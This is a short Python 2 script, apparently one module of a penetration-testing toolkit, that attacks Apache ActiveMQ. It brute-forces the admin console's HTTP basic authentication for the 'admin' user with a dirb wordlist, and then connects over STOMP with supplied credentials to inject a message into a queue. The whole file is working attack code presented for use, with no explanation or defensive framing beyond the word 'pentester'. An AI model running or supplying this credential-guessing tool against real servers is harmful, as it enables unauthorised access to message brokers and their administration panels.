#!/usr/bin/env python
# path13: testing activemq - admin panel
# 
# based on:
#   https://raw.githubusercontent.com/c610/tmp/master/actlikeMQ.py
# 
# detailed tutorial:
#   https://www.youtube.com/watch?v=CD-E-LDc384
# 
# current:
#   - bf 
#   - sender  

# --- imports ---
import subprocess
import re
import sys
import requests
from requests.auth import HTTPBasicAuth
from stomp import * # for STOMP protocol
import stomp

# --- super colours ---
HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'



def bfadmin():
  print OKGREEN + '  [+] path 13a: testing activemq - admin panel' + ENDC
  print ''

  print BOLD
  target = raw_input('    set target: ')
  port = raw_input('    set port: ')

  remote_host = 'http://' + target + ':' + port + '/admin/'
  our_user = 'admin'
  pwd_file = '/usr/share/wordlists/dirb/common.txt'

  try:
    sess = requests.session()

    read_pwds = open(pwd_file, 'r')
    pwds = read_pwds.readlines()

    for pwd in pwds:
      pwd = pwd.rstrip()  
      logme = sess.post(remote_host, auth=HTTPBasicAuth(our_user, pwd))
      logmeresp = logme.text

      #print logmeresp 
      if 'ActiveMQ Console</title>' in logmeresp:
        print '[+] admin user logged-in! :D'
        sys.exit(0) # w0w s0 1337!11 

  except requests.exceptions.ConnectionError:
    print FAIL + '  [-] Can not connect to remote ActiveMQ panel :C\n' + ENDC 

  print '' + BOLD
  print '  [+] path 13a: testing activemq - admin panel' + ENDC
  print ''


# send msg to remote MQ
def sender():

  print OKGREEN + '  [+] path 13b: testing activemq - admin panel' + ENDC
  print ''

  print BOLD
  target = raw_input('    set target: ')
  port = raw_input('    set port: ') # 61616/tcp
  username = raw_input('    set user: ')
  passwd = raw_input('    set password: ')
  our_queue = raw_input('    set queue: ') # /queue/test1
  print ENDC

  try:
    conn = stomp.Connection( [ (target, port)])
    conn.start()
    print OKGREEN
    print '  [+] connecting to %s on port %s' % ( target , port )
    print ENDC
    print '  [i] now trying to log in...'

    print OKGREEN
    conn.connect(username, passwd, wait=False) # True)
    print ENDC

    conn.send( our_queue, 'msg from pentester ;)')
    conn.disconnect()

  except stomp.exception.ConnectFailedException:
    print FAIL + '  [-] Can not connect to remote MQ, sorry :C\n' + ENDC

  print '' + BOLD
  print '  [+] path 13b: testing activemq - admin panel' + ENDC
  print ''

  